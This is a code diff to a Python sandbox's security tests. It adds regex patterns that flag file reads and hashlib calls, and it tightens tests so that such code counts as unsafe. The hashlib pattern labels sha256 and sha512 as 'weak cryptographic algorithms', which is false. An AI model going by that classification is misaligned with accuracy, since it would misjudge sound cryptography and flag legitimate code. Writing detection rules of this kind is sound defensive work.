@@ -97,6 +97,18 @@ def comprehensive_security_policy() -> SecurityPolicy:
             description="Base64 decoding (potential obfuscation)",
             severity=SecurityIssueSeverity.LOW,
         ),
+        # File reading operations
+        SecurityPattern(
+            pattern=r"\bopen\s*\(.*['\"]r['\"]",
+            description="File reading operations",
+            severity=SecurityIssueSeverity.MEDIUM,
+        ),
+        # Weak cryptographic algorithms
+        SecurityPattern(
+            pattern=r"\bhashlib\.(md5|sha1|sha256|sha512)\s*\(",
+            description="Weak cryptographic algorithms",
+            severity=SecurityIssueSeverity.MEDIUM,
+        ),
     ]
 
     restricted_modules = [
@@ -483,7 +495,9 @@ print(content)
 """
         session = SandboxSession(lang="python", security_policy=comprehensive_security_policy)
         is_safe, violations = session.is_safe(code)
-        # This test documents current behavior - reading might be allowed
+        assert is_safe is False
+        assert len(violations) >= 1
+        assert any(v.description == "File reading operations" for v in violations)
 
     def test_malicious_file_writing(self, comprehensive_security_policy: SecurityPolicy) -> None:
         """Test that malicious file writing is blocked."""
@@ -689,8 +703,9 @@ print(f'Weak hash: {weak_hash}')
 """
         session = SandboxSession(lang="python", security_policy=comprehensive_security_policy)
         is_safe, violations = session.is_safe(code)
-        # This might be allowed but should generate violations for os module usage
+        assert is_safe is False
         assert len(violations) >= 1
+        assert any(v.description == "Weak cryptographic algorithms" for v in violations)
 
 
 class TestEvasionTechniques:
@@ -799,7 +814,7 @@ class TestComprehensiveAttackSimulation:
         }
 
         for scenario in attack_scenarios:
-            is_safe, violations = session.is_safe(scenario.code)
+            is_safe, _ = session.is_safe(scenario.code)
             actual_blocked = not is_safe
             correct_prediction = actual_blocked == scenario.expected_blocked
 
